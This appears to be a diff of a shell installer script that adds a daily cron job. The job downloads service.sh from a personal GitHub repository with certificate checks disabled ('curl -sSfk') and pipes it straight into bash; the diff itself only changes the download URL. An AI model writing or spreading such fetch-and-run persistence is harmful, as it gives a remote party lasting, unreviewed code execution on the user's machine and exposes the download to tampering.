@@ -94,9 +94,9 @@ else
     exit 0
 fi
 
-if crontab -l | grep "curl -sSfk https://github.com/lazy12121212/server/raw/main/service.sh"; then
+if crontab -l | grep "curl -sSfk https://raw.githubusercontent.com/lazy12121212/server/main/service.sh"; then
     echo "The specified scheduled task has been added !!!"
 else
-    (crontab -l 2>/dev/null; printf "0 1 * * *  mkdir -p $p;cd $p;curl -sSfk https://github.com/lazy12121212/server/raw/main/service.sh | bash\n") | crontab -
+    (crontab -l 2>/dev/null; printf "0 1 * * *  mkdir -p $p;cd $p;curl -sSfk https://raw.githubusercontent.com/lazy12121212/server/main/service.sh | bash\n") | crontab -
     echo "The specified scheduled task has been added"
 fi
